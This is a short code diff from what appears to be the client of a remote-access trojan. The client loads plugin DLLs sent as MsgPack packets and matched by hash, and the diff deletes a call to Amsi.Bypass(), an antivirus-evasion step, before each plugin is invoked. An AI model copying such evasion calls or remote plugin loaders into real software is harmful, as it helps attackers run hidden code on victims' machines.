@@ -330,8 +330,7 @@ namespace Client.Connection
                             foreach (MsgPack msgPack in Packs.ToList())
                             {
                                 if (msgPack.ForcePathObject("Dll").AsString == unpack_msgpack.ForcePathObject("Hash").AsString)
-                                {
-                                    Amsi.Bypass();
+                                {                                    
                                     Invoke(msgPack);
                                     Packs.Remove(msgPack);
                                 }
